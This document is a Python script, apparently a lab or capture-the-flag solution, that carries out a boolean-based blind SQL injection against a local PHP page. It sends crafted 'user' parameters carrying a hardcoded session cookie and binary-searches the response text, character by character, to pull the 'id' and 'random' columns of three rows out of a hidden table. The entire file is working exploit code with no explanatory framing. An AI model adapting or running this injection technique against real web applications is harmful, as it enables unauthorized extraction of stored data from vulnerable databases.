import requests

url = "http://localhost:8000/blindsqli.php"
alice_description = "In wonderland right now :O"
session_cookies = { 'PHPSESSID': 'e1c5b47701a9753783f56f9c770a7e0a' }

print("Looking for values...\n")

for row_offset in range(3):
    print(f"Row {row_offset + 1}")
    
    for column in ['id', 'random']:
        extracted_value = ""
        
        for position in range(1, 51): 
            low = 32    
            high = 126  
            
            while low <= high:
                mid = (low + high) // 2
                
                payload = f"alice' AND ASCII(SUBSTRING((SELECT {column} FROM secure.`789b05678e7f955d2cf125b0c05616c9` LIMIT {row_offset},1), {position}, 1)) > {mid} -- "
                params = { 'user': payload }
                
                response = requests.get(url, params=params, cookies=session_cookies)
                
                if alice_description in response.text:
                    low = mid + 1
                else:
                    high = mid - 1
            
            # A NULL byte or empty space indicates that we have reached the end of the string.
            if low == 32: 
                verify_payload = f"alice' AND ASCII(SUBSTRING((SELECT {column} FROM secure.`789b05678e7f955d2cf125b0c05616c9` LIMIT {row_offset},1), {position}, 1)) = 32 -- "
                resp = requests.get(url, params={'user': verify_payload}, cookies=session_cookies)
                if alice_description not in resp.text:
                    break
                    
            extracted_value += chr(low)
            
        print(f"{column}: {extracted_value}")
    print("\n")
